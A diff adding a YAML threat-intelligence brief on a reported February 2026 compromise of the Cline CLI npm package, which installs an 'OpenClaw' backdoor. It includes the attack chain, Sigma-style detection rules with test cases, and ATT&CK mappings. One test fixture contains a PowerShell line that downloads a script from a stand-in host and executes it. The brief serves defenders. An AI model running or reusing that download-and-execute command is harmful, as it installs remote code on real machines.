@@ -1,0 +1,112 @@
+id: brief-2026-02-21-cline-supply-chain
+slug: 2026-02-cline-supply-chain
+title: Compromised Cline CLI npm Package Installing OpenClaw
+summary: The Cline CLI npm package was compromised, resulting in the silent installation of the OpenClaw backdoor on developer machines.
+severity: high
+published_at: "2026-02-20T21:56:15Z"
+content: |
+    ## Overview
+
+    On February 20, 2026, reports surfaced regarding the compromise of the Cline CLI npm package.  An attacker hijacked the package and injected malicious code to silently install the OpenClaw backdoor onto the machines of developers who installed or updated the compromised package. The attack specifically targets developers using the Cline CLI tool, potentially impacting software development pipelines and introducing a supply chain risk. The initial scope of the compromise is currently unknown, but the silent installation and potential for data exfiltration or further malicious activities raise significant concerns.
+
+    ## Attack Chain
+
+    1.  Attacker compromises the Cline CLI npm package.
+    2.  Malicious code is injected into the package.
+    3.  Developers install or update the Cline CLI package, unknowingly downloading the compromised version.
+    4.  Upon installation, the malicious code executes silently in the background.
+    5.  The malicious code downloads and installs the OpenClaw backdoor.
+    6.  OpenClaw establishes persistence on the infected system.
+    7.  OpenClaw begins beaconing to a command-and-control server.
+    8.  Attacker uses OpenClaw to perform reconnaissance, data exfiltration, or deploy additional payloads.
+
+    ## Impact
+
+    The compromise of the Cline CLI npm package has potentially widespread consequences. Developers who unknowingly installed the malicious package may have had the OpenClaw backdoor installed on their machines. This could lead to the exfiltration of sensitive source code, credentials, or other proprietary information. Furthermore, the compromised machines could be used as a foothold for further attacks against the organization's infrastructure. The exact number of affected developers and organizations is currently unknown, but the nature of supply chain attacks suggests a potentially large victim pool.
+tags:
+    - supply-chain
+    - npm
+    - backdoor
+references:
+    - https://www.reddit.com/r/blueteamsec/comments/1ra8tk6/cline_cli_compromised_hijacked_npm_package/
+    - https://awesomeagents.ai/news/cline-npm-supply-chain-attack/
+rules:
+    - title: Detect Cline CLI Package Installation
+      description: Detects installation of Cline CLI npm package.
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        condition: selection
+        selection:
+            CommandLine|contains: npm install cline
+      level: informational
+      tags:
+        - attack.supply_chain
+        - attack.t1195
+      tests:
+        positive:
+            - name: Cline install via npm
+              data:
+                - CommandLine: npm install cline
+                - Image: C:\Program Files\nodejs\npm.cmd
+        negative:
+            - name: Installing other package
+              data:
+                - CommandLine: npm install express
+                - Image: C:\Program Files\nodejs\npm.cmd
+    - title: Detect Potential OpenClaw Installation
+      description: Detects potential OpenClaw installation via suspicious process execution.
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        condition: selection
+        selection:
+            CommandLine|contains: openclaw
+      level: high
+      tags:
+        - attack.installation
+        - attack.t1566.001
+      tests:
+        positive:
+            - name: OpenClaw install command
+              data:
+                - CommandLine: powershell -c Invoke-WebRequest -Uri http://example.com/openclaw.ps1 | Invoke-Expression
+                - Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        negative:
+            - name: Legitimate powershell usage
+              data:
+                - CommandLine: powershell -version
+                - Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ttps:
+    - tactic_id: TA0042
+      tactic_name: Resource Development
+      technique_id: T1588
+      technique_name: Obtain Capabilities
+      subtechnique_id: T1588.002
+      subtechnique_name: Tool
+    - tactic_id: TA0007
+      tactic_name: Discovery
+      technique_id: T1082
+      technique_name: System Information Discovery
+    - tactic_id: TA0003
+      tactic_name: Persistence
+      technique_id: T1547
+      technique_name: Boot or Logon Autostart Execution
+      subtechnique_id: T1547.001
+      subtechnique_name: Registry Run Keys / Startup Folder
+    - tactic_id: TA0011
+      tactic_name: Command and Control
+      technique_id: T1071
+      technique_name: Application Layer Protocol
+      subtechnique_id: T1071.001
+      subtechnique_name: Web Protocols
+    - tactic_id: TA0009
+      tactic_name: Collection
+      technique_id: T1119
+      technique_name: Automated Collection
+    - tactic_id: TA0010
+      tactic_name: Exfiltration
+      technique_id: T1041
+      technique_name: Exfiltration Over C2 Channel
